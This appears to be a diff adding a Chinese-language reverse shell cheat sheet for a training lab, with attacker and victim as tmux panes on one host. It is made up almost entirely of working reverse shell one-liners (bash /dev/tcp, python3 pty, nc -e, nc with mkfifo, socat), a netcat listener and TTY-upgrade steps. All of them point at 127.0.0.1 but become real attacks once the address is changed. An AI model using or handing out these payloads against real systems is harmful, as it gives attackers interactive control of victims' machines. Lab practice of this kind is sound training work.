@@ -1,0 +1,56 @@
+REVERSE SHELL CHEAT SHEET
+=========================
+
+情境
+  ATTACKER 開 listener  →  VICTIM 把 shell 連回 ATTACKER。
+  在這個 lab 容器裡，attacker 跟 victim 都是「同一台機器的不同 tmux pane」。
+
+設定 tmux 兩個 pane
+  $ tmux                          進 tmux
+  Ctrl-b |                        垂直分割（左右）
+  Ctrl-b -                        水平分割（上下）
+  Ctrl-b 方向鍵                   切換 pane
+
+ATTACKER 端（pane A）
+  nc -lnvp 4444
+    -l   listen
+    -n   不做 DNS
+    -v   verbose
+    -p   port
+
+VICTIM 端（pane B）— 從以下任挑一個丟回 attacker
+
+bash (最常見)
+  bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+
+bash 變體（沒有 /dev/tcp 時）
+  exec 5<>/dev/tcp/127.0.0.1/4444; cat <&5 | while read l; do $l 2>&5 >&5; done
+
+python3
+  python3 -c 'import os,pty,socket; s=socket.socket(); s.connect(("127.0.0.1",4444)); [os.dup2(s.fileno(),f) for f in (0,1,2)]; pty.spawn("/bin/bash")'
+
+nc (with -e，多數現代 distro 不支援)
+  nc -e /bin/bash 127.0.0.1 4444
+
+nc (without -e，用 mkfifo)
+  rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc 127.0.0.1 4444 > /tmp/f
+
+socat (最穩，TTY 友善)
+  socat TCP:127.0.0.1:4444 EXEC:'bash -li',pty,stderr,setsid,sigint,sane
+  ATTACKER 端對應：
+  socat -,raw,echo=0 TCP-LISTEN:4444
+
+把 dumb shell 升級成完整 TTY（拿到 reverse shell 後在 attacker 端打）
+  python3 -c 'import pty; pty.spawn("/bin/bash")'
+  Ctrl-Z                          把 nc/socat 丟到背景
+  stty raw -echo; fg              attacker host 端設原始模式再叫回前景
+  stty rows 40 cols 120           告訴 victim 終端大小
+  export TERM=xterm
+
+驗證連線
+  在 attacker pane 看到 "connect to ... from ..." 就是進來了。
+  打 `id` 應該回傳跟 victim 端一樣的 user。
+
+清乾淨
+  attacker pane: Ctrl-C 中斷 nc/socat
+  victim pane: 如果 stuck，Ctrl-C 然後 reset
